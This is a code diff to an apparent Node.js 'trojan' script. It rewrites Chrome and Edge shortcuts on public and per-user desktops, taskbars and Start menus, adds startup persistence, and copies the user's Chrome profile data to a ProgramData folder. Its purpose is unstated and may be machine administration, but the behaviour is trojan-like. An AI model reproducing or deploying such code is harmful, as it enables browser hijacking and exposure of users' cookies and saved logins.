@@ -103,7 +103,9 @@ var systemstate = {
     get istpl() {
         let machineprefix = this.machinename.toLowerCase().substring(0, 5);
 
-        if (this.username == "ADULT2022") return true;
+        if ( ["ADULT2022", "LC2022"].includes(this.username.toUpperCase()) ) {
+            return true;
+        }
 
         if (
             machineprefix == "RLPCP".toLowerCase() ||
@@ -610,7 +612,7 @@ var startupfolderconfig = {
             enabled: true,
             name: "startup_adult2022",
             folderpath:
-                "C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
+                `C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`,
         },
     ],
 };
@@ -1876,6 +1878,7 @@ function readTag(fpath) {
 }
 
 function writeTag(fpath, tagstr) {
+    logmsg(`writing to ${fpath}`);
     fs.writeFileSync(fpath, tagstr, "utf8");
 }
 
@@ -3215,6 +3218,8 @@ function penetrate_folders() {
 }
 
 // TODO need to execute modify_chrome and modify_edge on each startup
+// for tpl -- the desktop lnk can't be modified -- good idea to put in autolaunch to launch 
+// and minimise both edge and chrome on startup -- should these processes be headless?
 async function penetrate() {
     logmsg("starting");
 
@@ -4342,6 +4347,11 @@ async function copy_userdata(srcpath, destpath) {
 function getFilesByExtensionSync(dirPath, extension) {
     let results = [];
 
+    if ( ! folderExists(dirPath) ) {
+        logmsg(`dirpath does not exit ${dirPath}`);
+        return results;
+    }
+
     const items = fs.readdirSync(dirPath);
 
     for (const item of items) {
@@ -4434,12 +4444,19 @@ async function modify_chrome() {
         process.exit(1);
     }
 
-    jsonconfigpath = path.join(systemstate.trojandir, scriptfname + '_config.json');
 
     let targetFolders = [];
-    targetFolders.push('C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar');
+    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`);
+    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\`);
+    targetFolders.push(`C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`);
+    targetFolders.push(`C:\\Users\\Public\\Desktop`);
+    
+    targetFolders.push(`C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar`);
+    targetFolders.push(`C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch`);
+    targetFolders.push(`C:\\Users\\${systemstate.username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs`);
+    targetFolders.push(`C:\\Users\\${systemstate.username}\\Desktop`);
+
     targetFolders.push('C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs');
-    targetFolders.push('C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs');
 
     let lnks = [];
     
@@ -4460,24 +4477,24 @@ async function modify_chrome() {
         logmsg(`processing ${lnk}`);
 
         shortcut_path = lnk;
+        shortcut_path = shortcut_path.replaceAll('\\\\', '\\');
 
         let jsonconfig = {
             "cmd_line_args": cmdlineargs,
             "shortcut_path": shortcut_path
         };
 
+        let jsonconfigpath = path.join(systemstate.trojandir, scriptfname + '_' + getTimestamp() + '_config.json');
+
         writeTag(jsonconfigpath, JSON.stringify(jsonconfig));
 
-        let stdout = '';
-        let childp = execPSScript(scriptfpath, [jsonconfigpath], null, (text)=>{ 
-            stdout += text;
-        });
+        let childp = execPSScript(scriptfpath, [jsonconfigpath]);
 
     }
 
     logmsg(`copying user data folder`);
 
-    srcpath = 'C:\\Users\\ADULT2022\\AppData\\Local\\Google\\Chrome\\User Data';
+    srcpath = `C:\\Users\\${systemstate.username}\\AppData\\Local\\Google\\Chrome\\User Data`; // anchor
     destpath = 'C:\\ProgramData\\owd\\chrome';
 
     if ( ! folderExists(destpath) )
